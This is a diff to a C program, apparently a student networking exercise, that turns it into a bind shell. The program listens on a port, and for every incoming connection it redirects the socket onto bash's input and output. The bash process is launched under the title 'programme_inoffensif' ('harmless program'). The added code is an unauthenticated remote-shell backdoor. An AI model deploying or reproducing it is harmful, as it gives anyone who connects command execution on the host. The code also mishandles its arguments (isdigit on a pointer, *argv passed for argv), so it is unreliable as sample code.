@@ -10,45 +10,57 @@
 #include "utils_v2.h"
 #include "network.h"
 
-void endHandler(int sig){
-    // TODO
-    return;
-}
-
-void startShell() {
+void startShell(int socketFD)
+{
   pid_t pid = fork();
 
-  if (pid == -1) {
+  if (pid == -1)
+  {
     perror("fork() error");
     return;
   }
 
-  if (pid == 0) {
-    char* args[] = {"bash","--title=\"programme_inoffensif\"", NULL};
+  if (pid == 0)
+  {
+    dup2(socketFD, STDERR_FILENO);
+    dup2(socketFD, STDOUT_FILENO);
+    dup2(socketFD, STDIN_FILENO);
+    char *args[] = {"bash", "--title=\"programme_inoffensif\"", NULL};
     execve("/bin/bash", args, NULL);
     perror("execve() error");
     _exit(1);
-  } else {
+  }
+  else
+  {
     int status;
     waitpid(pid, &status, 0);
   }
 }
 
-int getPort(int nbArg, const char *const tabArg[]){
-    int port;
-    if (nbArg > 1 && isdigit(tabArg[1]))
-    {
-        port = atoi(tabArg[1]);
-    } else
-    {
-        port = tabPorts[randomIntBetween(1,10)];
-    }
+int getPort(int nbArg, const char *const tabArg[])
+{
+  int port;
+  if (nbArg > 1 && isdigit(tabArg[1]))
+  {
+    port = atoi(tabArg[1]);
+  }
+  else
+  {
+    port = tabPorts[randomIntBetween(1, 10)];
+  }
 
-    return port;
+  return port;
 }
 
 int main(int argc, char const *argv[])
 {
-    startShell();
-    return 0;
+  int sockfd = initSocketServer(getPort(argc, *argv));
+
+  while (1)
+  {
+    int socketForThisAccept = saccept(sockfd);
+    startShell(socketForThisAccept);
+  }
+
+  return 0;
 }
